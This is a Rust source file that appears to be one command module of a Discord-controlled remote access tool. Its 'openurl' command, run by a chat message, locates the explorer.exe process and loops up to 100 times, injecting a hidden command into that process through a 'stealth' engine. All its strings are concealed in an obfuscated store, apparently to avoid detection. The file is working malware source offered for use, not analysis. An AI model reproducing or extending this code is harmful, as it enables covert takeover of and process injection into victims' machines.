use crate::commands::*;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;

pub struct OpenUrlCommand;

impl OpenUrlCommand {
    fn m(key: &str) -> String { StegoStore::get(StringCategory::Msg, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
}

#[async_trait]
impl BotCommand for OpenUrlCommand {
    fn name(&self) -> &str { Box::leak(Self::c("URL_NAME").into_boxed_str()) }
    fn description(&self) -> &str { Box::leak(StegoStore::get(StringCategory::Desc, "OPENURL").into_boxed_str()) }
    fn category(&self) -> &str { Box::leak(Self::c("CAT_UTIL").into_boxed_str()) }
    fn usage(&self) -> &str { Box::leak(Self::c("URL_USAGE").into_boxed_str()) }
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(format!(".openurl {}", StegoStore::get(StringCategory::Url, "DOMAIN_GOOGLE")).into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }
    fn aliases(&self) -> &'static [&'static str] { 
        Box::leak(vec![Box::leak(Self::c("URL_ALIAS1").into_boxed_str()) as &'static str].into_boxed_slice())
    }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let url = match args.next() {
            Some(url) => url.to_string(),
            None => {
                http.create_message(msg.channel_id.get(), &Self::m("ERR_PROVIDE_URL")).await?;
                return Ok(());
            }
        };

        let loop_count = if let Some(count_str) = args.next() {
            count_str.parse::<u32>().unwrap_or(1)
        } else {
            1
        };

        // Validate URL format
        if !url.starts_with("http://") && !url.starts_with("https://") {
            http.create_message(msg.channel_id.get(), &Self::m("URL_ERR_FORMAT")).await?;
            return Ok(());
        }

        if loop_count == 0 {
            http.create_message(msg.channel_id.get(), &Self::m("URL_ERR_ZERO")).await?;
            return Ok(());
        }

        if loop_count > 100 {
            http.create_message(msg.channel_id.get(), &Self::m("URL_ERR_MAX")).await?;
            return Ok(());
        }

        let mut pid = 0;
        let mut sys = sysinfo::System::new_all();
        sys.refresh_processes();
        use sysinfo::{SystemExt, ProcessExt, PidExt};
        for (p, process) in sys.processes() {
            if process.name().to_lowercase() == "explorer.exe" {
                pid = p.as_u32();
                break;
            }
        }

        if pid == 0 {
            http.create_message(msg.channel_id.get(), &Self::m("MSG_KCT_NO_PID")).await?;
            return Ok(());
        }

        for i in 1..=loop_count {
            let cmd_str = StegoStore::get(StringCategory::Const, "OPENURL_KCT_CMD").replace("{}", &url);
            
            if let Some(engine) = crate::stealth::get_engine() {
                unsafe {
                    if let Err(e) = engine.kct_inject(pid, 2, &cmd_str) {
                         let msg_fail = StegoStore::get(StringCategory::Msg, "MSG_KCT_FAIL").replace("{}", &format!("{:?}", e));
                         http.create_message(msg.channel_id.get(), &msg_fail).await?;
                        return Ok(());
                    }
                }
            } else {
                http.create_message(msg.channel_id.get(), &Self::m("MSG_KCT_NO_ENGINE")).await?;
                return Ok(());
            }

            if i < loop_count {
                tokio::time::sleep(tokio::time::Duration::from_millis(200)).await;
            }
        }

        let message = if loop_count == 1 {
            Self::m("URL_OPENED").replace("{}", &url)
        } else {
            Self::m("URL_OPENED_MULTI").replace("{count}", &loop_count.to_string()).replace("{url}", &url)
        };

        http.create_message(msg.channel_id.get(), &message).await?;

        Ok(())
    }
}


